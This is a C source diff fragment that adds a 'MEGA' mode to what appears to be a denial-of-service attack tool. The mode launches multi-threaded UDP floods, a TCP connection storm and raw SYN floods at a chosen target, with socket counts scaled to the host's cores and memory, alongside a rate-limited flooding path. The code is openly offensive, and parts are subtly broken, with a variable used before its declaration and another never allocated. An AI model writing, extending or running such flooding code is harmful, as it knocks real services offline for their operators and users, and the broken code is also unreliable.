+    if (atk->mega_mode || !strcmp(atk->method, "MEGA")) {
+        int cores = get_nprocs();
+        if (cores < 1) cores = 1;
+
+        /* Adaptive sockets: cores * 8, capped by free RAM and MEGA_MAX_SOCKS */
+        struct sysinfo si;
+        long free_mb = 512;
+        if (sysinfo(&si) == 0)
+            free_mb = (long)(si.freeram / (1024 * 1024));
+        int max_sk = cores * MEGA_SOCKS_PER_CPU;
+        int ram_cap = (int)(free_mb / 2); /* ~2MB per socket */ /* ~4MB kernel+user buf per sock */
+        if (ram_cap < 8) ram_cap = 8;
+        if (max_sk > ram_cap) max_sk = ram_cap;
+        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
+        if (max_sk < 8) max_sk = 8;
+
+        /* Thread layout: majority UDP mega, + TCP storm, + SYN if raw works */
+        int n_udp = cores;
+        if (n_udp < 1) n_udp = 1;
+        if (n_udp > 8) n_udp = 8;
+        if (n_udp > sock_cnt) n_udp = sock_cnt; /* BUG-1.1: cap to available sockets */
+        int n_tcp = (cores >= 2) ? 1 : 1;
+        int n_syn = 0;
+        int raw_probe = create_raw_socket(IPPROTO_TCP);
+        if (raw_probe >= 0) { close(raw_probe); n_syn = 1; }
+        int threads = n_udp + n_tcp + n_syn;
+
+        int *socks = calloc((size_t)max_sk, sizeof(int));
+        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
+        int sock_cnt = 0;
+        for (int i = 0; i < max_sk; i++) {
+            int s = create_udp_socket();
+            if (s < 0) break;
+            socks[sock_cnt++] = s;
+        }
+        if (sock_cnt < 1) {
+            free(socks);
+            g_attack_active = 0; free(ctx); return NULL;
+        }
+
+        struct sockaddr_in ta;
+        memset(&ta, 0, sizeof(ta));
+        ta.sin_family = AF_INET;
+        ta.sin_port = htons((uint16_t)atk->port);
+        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
+            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
+            free(socks);
+            g_attack_active = 0; free(ctx); return NULL;
+        }
+
+        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
+        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
+        if (!tids || !mt) {
+            free(socks); free(tids); free(mt);
+            g_attack_active = 0; free(ctx); return NULL;
+        }
+
+        pthread_attr_t attr;
+        pthread_attr_init(&attr);
+        pthread_attr_setstacksize(&attr, 512 * 1024);
+
+        int ti = 0;
+        int spth = sock_cnt / n_udp;
+        if (spth < 1) spth = 1;
+        for (int i = 0; i < n_udp; i++) {
+            mt[ti].socks = &socks[i * spth];
+            mt[ti].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
+            if (mt[ti].sock_count < 1) mt[ti].sock_count = 1;
+            mt[ti].target = ta;
+            mt[ti].port = atk->port;
+            mt[ti].duration = atk->duration_secs;
+            mt[ti].cpu_id = i;
+            mt[ti].mode = 0; /* UDP mega */
+            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
+            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
+            ti++;
+        }
+        /* TCP connection storm */
+        mt[ti].socks = NULL; mt[ti].sock_count = 0;
+        mt[ti].target = ta; mt[ti].port = atk->port;
+        mt[ti].duration = atk->duration_secs;
+        mt[ti].cpu_id = n_udp % cores;
+        mt[ti].mode = 1;
+        strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
+        pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
+        ti++;
+        /* SYN raw if available */
+        if (n_syn) {
+            mt[ti].socks = NULL; mt[ti].sock_count = 0;
+            mt[ti].target = ta; mt[ti].port = atk->port;
+            mt[ti].duration = atk->duration_secs;
+            mt[ti].cpu_id = (n_udp + 1) % cores;
+            mt[ti].mode = 2;
+            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
+            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
+            ti++;
+        }
+        pthread_attr_destroy(&attr);
+
+        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
+        g_attack_stop = 1;
+        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
+        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
+        free(socks); free(tids); free(mt);
+    } else {
+        struct sockaddr_in ta;
+        memset(&ta, 0, sizeof(ta));
+        ta.sin_family = AF_INET;
+        ta.sin_port = htons((uint16_t)atk->port);
+        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
+            g_attack_active = 0; free(ctx); return NULL;
+        }
+        TokenBucket tb;
+        /* Shared rate across workers; burst = 2x for spikes */
+        double rate = (double)(atk->max_pps > 0 ? atk->max_pps : 100000);
+        tb_init(&tb, rate, rate * 2.0);
+        int cores = get_nprocs();
+        if (cores < 1) cores = 1;
+        int nc = (int)atk->max_threads;
+        if (nc < 1) nc = cores * 2;
+        if (nc > cores * 4) nc = cores * 4; /* cap: avoid thrash */
+        if (nc > 32) nc = 32;
+        if (nc < 1) nc = 1;
+        /* Per-worker rate share so total ≈ max_pps */
+        double per = rate / (double)nc;
+        if (per < 1) per = 1;
+
+        pthread_t *tids = malloc((size_t)nc * sizeof(pthread_t));
+        if (!tids) { g_attack_active = 0; free(ctx); return NULL; }
+        int launched = 0;
+        for (int i = 0; i < nc; i++) {
+            AttackParams *ap = malloc(sizeof(AttackParams));
+            TokenBucket *tbp = malloc(sizeof(TokenBucket));
+            if (!w || !ap || !tbp) { free(w); free(ap); free(tbp); continue; }
+            memcpy(ap, atk, sizeof(AttackParams));
+            tb_init(tbp, per, per * 2.0);
+            w->ap = ap; w->tb = tbp; w->ta = ta; w->cpu = i % cores;
+            if (pthread_create(&tids[launched], NULL, attack_worker, w) == 0)
+                launched++;
+            else {
+                free(ap); free(tbp); free(w);
+            }
+        }
+        nc = launched;
+        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
+        g_attack_stop = 1;
+        for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
+        free(tids);
+    }
     fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
     g_attack_active = 0;
     free(ctx);
